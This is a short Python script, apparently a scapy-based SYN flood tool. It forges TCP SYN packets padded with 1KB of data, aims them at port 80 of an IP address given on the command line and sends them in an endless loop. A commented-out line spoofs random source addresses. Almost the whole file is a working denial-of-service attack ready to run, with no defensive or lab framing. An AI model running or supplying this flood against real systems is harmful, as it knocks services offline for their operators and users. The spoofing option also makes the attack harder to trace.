#!/usr/bin/env python3

import sys
from scapy.all import *

target_ip = sys.argv[1]
print("target_ip:", target_ip)
target_port = 80


# forge IP packet with target ip as the destination IP address
ip = IP(dst=target_ip)
# or if you want to perform IP Spoofing (will work as well)
#ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)

# forge a TCP SYN packet with a random source port
# and the target port as the destination port
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

# add some flooding data (1KB in this case)
raw = Raw(b"X"*1024)

# stack up the layers
pkg = ip/tcp/raw
print(pkg.show())

# send the constructed packet in a loop until CTRL+C is detected 
print("sending packages syn")
send(pkg, loop=1, verbose=1, iface="en0")

